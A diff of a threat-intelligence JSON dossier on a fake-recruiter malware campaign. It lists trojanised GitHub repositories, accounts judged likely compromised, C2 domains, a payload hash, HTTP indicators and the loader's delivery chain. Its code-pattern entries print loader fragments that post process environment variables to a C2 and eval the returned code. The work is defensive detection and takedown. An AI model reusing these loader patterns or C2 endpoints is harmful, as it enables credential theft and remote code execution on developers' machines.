+        "login": "eastmade",
+        "id": 34521427,
+        "type": "user",
+        "public_repos": 20,
+        "created": "2017-12-13",
+        "verdict": "likely compromised legitimate / candidate-fooled (investigate, don't suspend)",
+        "verdict_class": "candidate-fooled",
+        "verdict_confidence": "medium"
+      },
+      {
+        "login": "MBhatti26",
+        "id": 201392127,
+        "type": "user",
+        "public_repos": 10,
+        "created": "2025-03-01",
+        "verdict": "likely compromised legitimate / candidate-fooled (investigate, don't suspend)",
+        "verdict_class": "candidate-fooled",
+        "verdict_confidence": "medium"
+      },
+      {
+        "login": "fabiolin",
+        "id": 7746934,
+        "type": "user",
+        "public_repos": 10,
+        "created": "2014-05-30",
+        "verdict": "likely compromised legitimate / candidate-fooled (investigate, don't suspend)",
+        "verdict_class": "candidate-fooled",
+        "verdict_confidence": "medium"
+      },
+      {
+        "login": "sharmapranay38",
+        "id": 74339002,
+        "type": "user",
+        "public_repos": 69,
+        "created": "2020-11-12",
+        "verdict": "likely compromised legitimate / candidate-fooled (investigate, don't suspend)",
+        "verdict_class": "candidate-fooled",
+        "verdict_confidence": "medium"
+      },
+      {
+        "login": "shri33",
+        "id": 76124911,
+        "type": "user",
+        "public_repos": 72,
+        "created": "2020-12-16",
+        "verdict": "likely compromised legitimate / candidate-fooled (investigate, don't suspend)",
+        "verdict_class": "candidate-fooled",
+        "verdict_confidence": "medium"
+      },
+      {
+        "login": "Paulooo0",
+        "id": 110143071,
+        "type": "user",
+        "public_repos": 41,
+        "created": "2022-07-28",
+        "verdict": "likely compromised legitimate / candidate-fooled (investigate, don't suspend)",
+        "verdict_class": "candidate-fooled",
+        "verdict_confidence": "medium"
+      },
+      {
+        "login": "KagiyamaWeb",
+        "id": 60941218,
+        "type": "user",
+        "public_repos": 14,
+        "created": "2020-02-11",
+        "verdict": "likely compromised legitimate / candidate-fooled (investigate, don't suspend)",
+        "verdict_class": "candidate-fooled",
+        "verdict_confidence": "medium"
+      },
+      {
+        "login": "Wilovy09",
+        "id": 68057133,
+        "type": "user",
+        "public_repos": 70,
+        "created": "2020-07-09",
+        "verdict": "likely compromised legitimate / candidate-fooled (investigate, don't suspend)",
+        "verdict_class": "candidate-fooled",
+        "verdict_confidence": "medium"
+      },
+      {
+        "login": "pablodiaz2799",
+        "id": 42582085,
+        "type": "user",
+        "public_repos": 17,
+        "created": "2018-08-21",
+        "verdict": "likely compromised legitimate / candidate-fooled (investigate, don't suspend)",
+        "verdict_class": "candidate-fooled",
+        "verdict_confidence": "medium"
+      },
+      {
+        "login": "Jay-Sojitra",
+        "id": 84234572,
+        "type": "user",
+        "public_repos": 75,
+        "created": "2021-05-15",
+        "verdict": "likely compromised legitimate / candidate-fooled (investigate, don't suspend)",
+        "verdict_class": "candidate-fooled",
+        "verdict_confidence": "medium"
+      },
+      {
+        "login": "ahmedraza90",
+        "id": 61561367,
+        "type": "user",
+        "public_repos": 36,
+        "created": "2020-02-27",
+        "verdict": "likely compromised legitimate / candidate-fooled (investigate, don't suspend)",
+        "verdict_class": "candidate-fooled",
+        "verdict_confidence": "medium"
+      }
     ],
     "repositories": {
-      "loader_paths": ["server/utils/regionChecker.js (sub-shape A)", "server/controllers/paymentController.js (sub-shape B)", "backend/src/compliance/complianceService.js (sub-shape C)", "server/mock/users.js (sub-shape D)", "app/controllers/settingController.js (sub-shape E; cross-gen with AjunaVerse-earlier)", "backend/src/utils/redis.js (sub-shape F)", "backend/src/constants/index.js (sub-shape G; constants-only — actual loader elsewhere)", "server/controllers/reportController.js (sub-shape G variant)", "server/controllers/ProductController.js (sub-shape G/H hybrid)", "backend/src/modules/departments/department-error.js (sub-shape H)"],
-      "current_generation_confirmed": ["realfraction/realfraction", "chainvisita-protocols/realfraction-mvp", "slobodanmargetic988/real-world-assets", "LandinLin/stockx_poc_1.03", "devcode8/stock-home-assignment", "0xbrentfi/StockX_PoC_1.03", "Chainbits1/StockX", "Lynqex-Labs/Stockx_PoC_v3", "metapulse54/RealEstateDemo", "RockTxoi/DeFi-Estate", "jaiu3d/DeFi-Estate", "kio87j/DeFi-Estate", "ricardomartins9899/SmartPay-Demo", "BVSLabs/blockchain-voting-system", "Cortexa-org/NitroGem", "eastmade/web3project-momo-token", "MBhatti26/Purrtal", "fabiolin/schoolmgmt", "sharmapranay38/new_age_blockchain", "shri33/Crypto-Trading-Platform", "Paulooo0/go-test", "KagiyamaWeb/PyPDFMicroservise", "Wilovy09/deby-assignment", "pablodiaz2799/solice-skill-test", "Jay-Sojitra/student-management-system", "sparsh-kr24/Student-Management-System", "ahmedraza90/test-fullstack"],
-      "current_generation_inferred": ["0xbrentfi/StockX_PoC_1.04", "Lynqex-Labs/gas-optimization", "kio87j/defi-estate-latest"],
-      "cross_generation_repos_also_carrying_realfraction_loader": ["jamesm-dev/NitroGem", "prahaladbelavadi/CoinLocatorDemo", "sky-cook/tokentradingdapp", "artemus-jarrett/blockchain-voting-system", "dappfusion/defi-real-estate", "InvescoHub/defi-real-estate", "TechByteX/NitroGem"]
+      "loader_paths": [
+        "server/utils/regionChecker.js (sub-shape A)",
+        "server/controllers/paymentController.js (sub-shape B)",
+        "backend/src/compliance/complianceService.js (sub-shape C)",
+        "server/mock/users.js (sub-shape D)",
+        "app/controllers/settingController.js (sub-shape E; cross-gen with AjunaVerse-earlier)",
+        "backend/src/utils/redis.js (sub-shape F)",
+        "backend/src/constants/index.js (sub-shape G; constants-only \u2014 actual loader elsewhere)",
+        "server/controllers/reportController.js (sub-shape G variant)",
+        "server/controllers/ProductController.js (sub-shape G/H hybrid)",
+        "backend/src/modules/departments/department-error.js (sub-shape H)"
+      ],
+      "current_generation_confirmed": [
+        "realfraction/realfraction",
+        "chainvisita-protocols/realfraction-mvp",
+        "slobodanmargetic988/real-world-assets",
+        "LandinLin/stockx_poc_1.03",
+        "devcode8/stock-home-assignment",
+        "0xbrentfi/StockX_PoC_1.03",
+        "Chainbits1/StockX",
+        "Lynqex-Labs/Stockx_PoC_v3",
+        "metapulse54/RealEstateDemo",
+        "RockTxoi/DeFi-Estate",
+        "jaiu3d/DeFi-Estate",
+        "kio87j/DeFi-Estate",
+        "ricardomartins9899/SmartPay-Demo",
+        "BVSLabs/blockchain-voting-system",
+        "Cortexa-org/NitroGem",
+        "eastmade/web3project-momo-token",
+        "MBhatti26/Purrtal",
+        "fabiolin/schoolmgmt",
+        "sharmapranay38/new_age_blockchain",
+        "shri33/Crypto-Trading-Platform",
+        "Paulooo0/go-test",
+        "KagiyamaWeb/PyPDFMicroservise",
+        "Wilovy09/deby-assignment",
+        "pablodiaz2799/solice-skill-test",
+        "Jay-Sojitra/student-management-system",
+        "sparsh-kr24/Student-Management-System",
+        "ahmedraza90/test-fullstack"
+      ],
+      "current_generation_inferred": [
+        "0xbrentfi/StockX_PoC_1.04",
+        "Lynqex-Labs/gas-optimization",
+        "kio87j/defi-estate-latest"
+      ],
+      "cross_generation_repos_also_carrying_realfraction_loader": [
+        "jamesm-dev/NitroGem",
+        "prahaladbelavadi/CoinLocatorDemo",
+        "sky-cook/tokentradingdapp",
+        "artemus-jarrett/blockchain-voting-system",
+        "dappfusion/defi-real-estate",
+        "InvescoHub/defi-real-estate",
+        "TechByteX/NitroGem"
+      ]
     }
   },
   "lure_brand_domains": [
-    {"value": "realfraction.xyz", "role": "lure-brand domain backing the realfraction GitHub org's contact email", "registrar": "Namecheap", "confidence": "high"}
+    {
+      "value": "realfraction.xyz",
+      "role": "lure-brand domain backing the realfraction GitHub org's contact email",
+      "registrar": "Namecheap",
+      "confidence": "high"
+    }
   ],
   "emails": [
-    {"value": "hello@realfraction.xyz", "source": "realfraction org profile", "note": "Contact email; domain separate from C2 domains"}
+    {
+      "value": "hello@realfraction.xyz",
+      "source": "realfraction org profile",
+      "note": "Contact email; domain separate from C2 domains"
+    }
   ],
   "hashes": {
     "git_commit_sha1": [
-      {"value": "8cc5120bfa3a64a6af14936ce821092ea08cd78d", "repo": "realfraction/realfraction", "ref": "main", "subject": "feat(server): add search, pagination, and apiFeatures utils", "files_changed": ["server/utils/errorHandler.js", "server/utils/regionChecker.js"], "note": "Subject is unrelated to files touched; classic trojan-commit camouflage. Sub-shape A original."}
+      {
+        "value": "8cc5120bfa3a64a6af14936ce821092ea08cd78d",
+        "repo": "realfraction/realfraction",
+        "ref": "main",
+        "subject": "feat(server): add search, pagination, and apiFeatures utils",
+        "files_changed": [
+          "server/utils/errorHandler.js",
+          "server/utils/regionChecker.js"
+        ],
+        "note": "Subject is unrelated to files touched; classic trojan-commit camouflage. Sub-shape A original."
+      }
     ],
     "stage2_payload": [
-      {"sha256": "dbd065a1e8d525acf81428bf131240e7ffd2913538052387f83fe3df83659ee0", "sha1": "86e37eaf7bc89897981cbefd0c979c002aa6b938", "size_bytes": 2914396, "captured_from": "https://www.isillegalregion.com/api/ip-check-encrypted/3aeb34a39", "captured_at": "2026-05-18T07:40:12Z", "delivery_status": "served to researcher IP (no allowlist gate observed)", "execution_status": "NOT executed", "obfuscation_style": "single-line obfuscator.io-style: object-property obfuscation (g/J/A/T/u keys with 0x... values), string-table indirection, hex-escape arrays"}
+      {
+        "sha256": "dbd065a1e8d525acf81428bf131240e7ffd2913538052387f83fe3df83659ee0",
+        "sha1": "86e37eaf7bc89897981cbefd0c979c002aa6b938",
+        "size_bytes": 2914396,
+        "captured_from": "https://www.isillegalregion.com/api/ip-check-encrypted/3aeb34a39",
+        "captured_at": "2026-05-18T07:40:12Z",
+        "delivery_status": "served to researcher IP (no allowlist gate observed)",
+        "execution_status": "NOT executed",
+        "obfuscation_style": "single-line obfuscator.io-style: object-property obfuscation (g/J/A/T/u keys with 0x... values), string-table indirection, hex-escape arrays"
+      }
     ]
   },
   "http_indicators": [
-    {"header": "x-secret-header: secret", "direction": "client->C2", "description": "Magic header sent by every realfraction-family loader; effectively zero false positive on outbound dev-host HTTP. NOTE: sub-shape C (stockx PoC) has a bug — headers passed in axios.post's data position so this header is NOT actually emitted on the wire from that sub-shape"},
-    {"header": "x-vercel-error: DEPLOYMENT_DISABLED", "direction": "C2->client", "description": "Vercel-emitted header for disabled deployments; observed on cookie-xi-seven.vercel.app and ip-check-api.vercel.app on 2026-05-18 — useful as corroborating signal that a known C2 has been taken down"},
-    {"header": "Server: Vercel", "direction": "C2->client", "description": "Confirms Vercel hosting for the live isillegalregion.com C2 (and Vercel hosting for the two disabled vercel.app deployments). Vercel abuse contact is the appropriate takedown path"},
-    {"body": "blocked", "direction": "C2->client", "description": "Literal 7-byte response body that causes the loader to return without eval; negative-gate sentinel (sub-shapes A and B only)"},
-    {"body": "{\"blocked\":true}", "direction": "C2->client", "description": "JSON form of the negative-gate sentinel; checked via JSON.parse(data)?.blocked (sub-shapes A and B only)"}
+    {
+      "header": "x-secret-header: secret",
+      "direction": "client->C2",
+      "description": "Magic header sent by every realfraction-family loader; effectively zero false positive on outbound dev-host HTTP. NOTE: sub-shape C (stockx PoC) has a bug \u2014 headers passed in axios.post's data position so this header is NOT actually emitted on the wire from that sub-shape"
+    },
+    {
+      "header": "x-vercel-error: DEPLOYMENT_DISABLED",
+      "direction": "C2->client",
+      "description": "Vercel-emitted header for disabled deployments; observed on cookie-xi-seven.vercel.app and ip-check-api.vercel.app on 2026-05-18 \u2014 useful as corroborating signal that a known C2 has been taken down"
+    },
+    {
+      "header": "Server: Vercel",
+      "direction": "C2->client",
+      "description": "Confirms Vercel hosting for the live isillegalregion.com C2 (and Vercel hosting for the two disabled vercel.app deployments). Vercel abuse contact is the appropriate takedown path"
+    },
+    {
+      "body": "blocked",
+      "direction": "C2->client",
+      "description": "Literal 7-byte response body that causes the loader to return without eval; negative-gate sentinel (sub-shapes A and B only)"
+    },
+    {
+      "body": "{\"blocked\":true}",
+      "direction": "C2->client",
+      "description": "JSON form of the negative-gate sentinel; checked via JSON.parse(data)?.blocked (sub-shapes A and B only)"
+    }
   ],
   "code_patterns": [
-    {"language": "javascript", "pattern": "https.request(regionCheckApi, { method: 'POST', headers: { 'x-secret-header': 'secret' } }", "confidence": "high", "context": "sub-shapes A/B"},
-    {"language": "javascript", "pattern": "axios.post(api, { ...process.env }, { headers: { \"x-secret-header\": \"secret\" } })", "confidence": "high", "context": "sub-shapes D/E/F — env-exfil-at-loader-stage variant"},
-    {"language": "javascript", "pattern": "axios.post(config.ipCheckUrl, { headers: { \"x-secret-header\": \"secret\" } })", "confidence": "high", "context": "sub-shape C — buggy variant where headers are in data position"},
-    {"language": "javascript", "pattern": "axios.get(`https://${host}/api/ipcheck-encrypted/${apiKey}`, { headers: { \"x-secret-header\": \"secret\" } })", "confidence": "high", "context": "sub-shape H"},
-    {"language": "javascript", "pattern": "eval(data)", "confidence": "medium", "context": "sub-shapes A/B"},
-    {"language": "javascript", "pattern": "eval(response.data)", "confidence": "medium", "context": "sub-shape C"},
-    {"language": "javascript", "pattern": "new Function.constructor(\"require\", errCode)", "confidence": "high", "context": "sub-shape H — sneaky equivalent of new Function() that evades grep on `new Function(`"},
-    {"language": "javascript", "pattern": "const regionChecker = require(\"../utils/regionChecker\");", "confidence": "medium", "context": "sub-shape A trigger; side-effect-only import; variable never read"},
-    {"language": "javascript", "pattern": "initializeComplianceService()", "confidence": "medium", "context": "sub-shape C trigger; called from backend/src/index.js at Express boot"},
-    {"language": "javascript", "pattern": "const API_HOST = 'cookie-xi-seven.vercel.app'; const API_SUB_URL = 'ipcheck-encrypted'; const SAMPLE_API_KEY = '6KDisdfjlskjDI837KJH4'", "confidence": "high", "context": "sub-shape G constants/index.js — distinctive template that appears byte-identical across multiple repos"}
+    {
+      "language": "javascript",
+      "pattern": "https.request(regionCheckApi, { method: 'POST', headers: { 'x-secret-header': 'secret' } }",
+      "confidence": "high",
+      "context": "sub-shapes A/B"
+    },
+    {
+      "language": "javascript",
+      "pattern": "axios.post(api, { ...process.env }, { headers: { \"x-secret-header\": \"secret\" } })",
+      "confidence": "high",
+      "context": "sub-shapes D/E/F \u2014 env-exfil-at-loader-stage variant"
+    },
+    {
+      "language": "javascript",
+      "pattern": "axios.post(config.ipCheckUrl, { headers: { \"x-secret-header\": \"secret\" } })",
+      "confidence": "high",
+      "context": "sub-shape C \u2014 buggy variant where headers are in data position"
+    },
+    {
+      "language": "javascript",
+      "pattern": "axios.get(`https://${host}/api/ipcheck-encrypted/${apiKey}`, { headers: { \"x-secret-header\": \"secret\" } })",
+      "confidence": "high",
+      "context": "sub-shape H"
+    },
+    {
+      "language": "javascript",
+      "pattern": "eval(data)",
+      "confidence": "medium",
+      "context": "sub-shapes A/B"
+    },
+    {
+      "language": "javascript",
+      "pattern": "eval(response.data)",
+      "confidence": "medium",
+      "context": "sub-shape C"
+    },
+    {
+      "language": "javascript",
+      "pattern": "new Function.constructor(\"require\", errCode)",
+      "confidence": "high",
+      "context": "sub-shape H \u2014 sneaky equivalent of new Function() that evades grep on `new Function(`"
+    },
+    {
+      "language": "javascript",
+      "pattern": "const regionChecker = require(\"../utils/regionChecker\");",
+      "confidence": "medium",
+      "context": "sub-shape A trigger; side-effect-only import; variable never read"
+    },
+    {
+      "language": "javascript",
+      "pattern": "initializeComplianceService()",
+      "confidence": "medium",
+      "context": "sub-shape C trigger; called from backend/src/index.js at Express boot"
+    },
+    {
+      "language": "javascript",
+      "pattern": "const API_HOST = 'cookie-xi-seven.vercel.app'; const API_SUB_URL = 'ipcheck-encrypted'; const SAMPLE_API_KEY = '6KDisdfjlskjDI837KJH4'",
+      "confidence": "high",
+      "context": "sub-shape G constants/index.js \u2014 distinctive template that appears byte-identical across multiple repos"
+    }
   ],
   "lures": [
     "Real-estate tokenization Web3 MVP (RealFraction; DeFi-Estate)",
@@ -119,28 +839,51 @@
   "delivery_chain": [
     "1. Fake-recruiter outreach delivers the repo URL (delivery vector not directly observed in this incident)",
     "2. Victim clones the repo. Sub-shapes A/B/C/G/H ship no preinstall/postinstall/prepare hooks; sub-shapes D/E/F may.",
-    "3. Victim runs `npm install` (most sub-shapes safe at this step) then `npm start` / `npm test` / `npm run build` — server boots and triggers the loader at module-load time (sub-shapes A/B/H) or via an init-call from server entrypoint (sub-shape C).",
+    "3. Victim runs `npm install` (most sub-shapes safe at this step) then `npm start` / `npm test` / `npm run build` \u2014 server boots and triggers the loader at module-load time (sub-shapes A/B/H) or via an init-call from server entrypoint (sub-shape C).",
     "4. Loader POSTs/GETs to the C2 with header x-secret-header: secret (where the variant actually sets it correctly on the wire).",
     "5. C2 returns 'blocked' / {blocked:true} for non-target IPs (sub-shapes A/B) or serves stage-2 JS payload for target IPs (and for the live isillegalregion.com host, apparently any IP that knows the URL).",
-    "6. Loader eval()s or Function.constructor-evaluates the response body in module scope — full Node RCE.",
-    "7. Stage-2 payload is heavily obfuscated obfuscator.io-style JS (~2.85 MB observed on isillegalregion.com) — believed to be a stealer/persistence agent; full reverse-engineering not performed."
+    "6. Loader eval()s or Function.constructor-evaluates the response body in module scope \u2014 full Node RCE.",
+    "7. Stage-2 payload is heavily obfuscated obfuscator.io-style JS (~2.85 MB observed on isillegalregion.com) \u2014 believed to be a stealer/persistence agent; full reverse-engineering not performed."
   ],
   "registrar_and_abuse_paths": [
-    {"domain": "ipregionchecker.com", "registrar": "Unstoppable Domains Inc.", "abuse_contact": "https://unstoppabledomains.com/abuse", "status": "already-actioned (registrar client hold set 2026-05-07)"},
-    {"domain": "isillegalregion.com", "registrar": "Name.com Inc.", "abuse_contact": "abuse@name.com / https://www.name.com/abuse-policy", "status": "active — registrar abuse filing appropriate to revoke the live C2 domain"},
-    {"domain": "realfraction.xyz", "registrar": "Namecheap", "abuse_contact": "abuse@namecheap.com", "status": "active — registrar abuse filing appropriate to revoke the lure-brand domain"},
-    {"platform": "Vercel", "abuse_contact": "https://vercel.com/help (use Vercel abuse desk)", "in_scope_deployments": ["isillegalregion.com (live; needs takedown)", "cookie-xi-seven.vercel.app (already DEPLOYMENT_DISABLED)", "ip-check-api.vercel.app (already DEPLOYMENT_DISABLED)"]}
+    {
+      "domain": "ipregionchecker.com",
+      "registrar": "Unstoppable Domains Inc.",
+      "abuse_contact": "https://unstoppabledomains.com/abuse",
+      "status": "already-actioned (registrar client hold set 2026-05-07)"
+    },
+    {
+      "domain": "isillegalregion.com",
+      "registrar": "Name.com Inc.",
+      "abuse_contact": "abuse@name.com / https://www.name.com/abuse-policy",
+      "status": "active \u2014 registrar abuse filing appropriate to revoke the live C2 domain"
+    },
+    {
+      "domain": "realfraction.xyz",
+      "registrar": "Namecheap",
+      "abuse_contact": "abuse@namecheap.com",
+      "status": "active \u2014 registrar abuse filing appropriate to revoke the lure-brand domain"
+    },
+    {
+      "platform": "Vercel",
+      "abuse_contact": "https://vercel.com/help (use Vercel abuse desk)",
+      "in_scope_deployments": [
+        "isillegalregion.com (live; needs takedown)",
+        "cookie-xi-seven.vercel.app (already DEPLOYMENT_DISABLED)",
+        "ip-check-api.vercel.app (already DEPLOYMENT_DISABLED)"
+      ]
+    }
   ],
   "comparison_with_ajunaverse_cluster": {
-    "summary": "Same broader Contagious Interview family. The realfraction-family generation as expanded by the 2026-05-18 cluster-expansion sweep is now known to share substantial infrastructure with the AjunaVerse-family: it uses Vercel hosting (isillegalregion.com + the two .vercel.app deployments), uses the AjunaVerse-family RCE primitive in sub-shape H (Function.constructor === Function), and uses the AjunaVerse-family env-exfil-at-loader-stage pattern in sub-shapes D/E/F. Several existing AjunaVerse-earlier-catalog repos (jamesm-dev/NitroGem, prahaladbelavadi/CoinLocatorDemo, sky-cook/tokentradingdapp, artemus-jarrett/blockchain-voting-system, dappfusion/defi-real-estate, InvescoHub/defi-real-estate, TechByteX/NitroGem) ALSO carry the realfraction-family loader in app/controllers/settingController.js — they are cross-generation repos. The two families overlap operationally, not just topically.",
+    "summary": "Same broader Contagious Interview family. The realfraction-family generation as expanded by the 2026-05-18 cluster-expansion sweep is now known to share substantial infrastructure with the AjunaVerse-family: it uses Vercel hosting (isillegalregion.com + the two .vercel.app deployments), uses the AjunaVerse-family RCE primitive in sub-shape H (Function.constructor === Function), and uses the AjunaVerse-family env-exfil-at-loader-stage pattern in sub-shapes D/E/F. Several existing AjunaVerse-earlier-catalog repos (jamesm-dev/NitroGem, prahaladbelavadi/CoinLocatorDemo, sky-cook/tokentradingdapp, artemus-jarrett/blockchain-voting-system, dappfusion/defi-real-estate, InvescoHub/defi-real-estate, TechByteX/NitroGem) ALSO carry the realfraction-family loader in app/controllers/settingController.js \u2014 they are cross-generation repos. The two families overlap operationally, not just topically.",
     "differences": {
       "loader_path": "Multiple per sub-shape A-H (see sub_shapes section)",
-      "rce_primitive": "eval / eval(response.data) / Function.constructor — varies by sub-shape; H matches AjunaVerse",
+      "rce_primitive": "eval / eval(response.data) / Function.constructor \u2014 varies by sub-shape; H matches AjunaVerse",
       "c2_delivery": "Hardcoded URL (sub-shapes A/B/G/H) or env-overridable config (sub-shape C)",
       "magic_header": "x-secret-header: secret (vs x-app-request: ip-check for AjunaVerse)",
       "negative_gate": "Response body 'blocked' / JSON {blocked:true} (sub-shapes A/B) vs HTTP 403 'Host not in allowlist' for AjunaVerse",
       "env_exfil_at_loader_stage": "varies by sub-shape (A/B/C/H: no; D/E/F: yes)",
-      "c2_host_family": "ipregionchecker.com (Unstoppable Domains; client-hold) + isillegalregion.com (Vercel; live) + .vercel.app (Vercel; disabled) — partial overlap with AjunaVerse-family Vercel infrastructure"
+      "c2_host_family": "ipregionchecker.com (Unstoppable Domains; client-hold) + isillegalregion.com (Vercel; live) + .vercel.app (Vercel; disabled) \u2014 partial overlap with AjunaVerse-family Vercel infrastructure"
     },
     "consequence_for_diagnostic_grep": "Existing dossier grep pattern needs to widen further to catch new fingerprints (isillegalregion.com / cookie-xi-seven / ip-check-api / Function.constructor / ipcheck-encrypted). See detection-rules.md."
   }
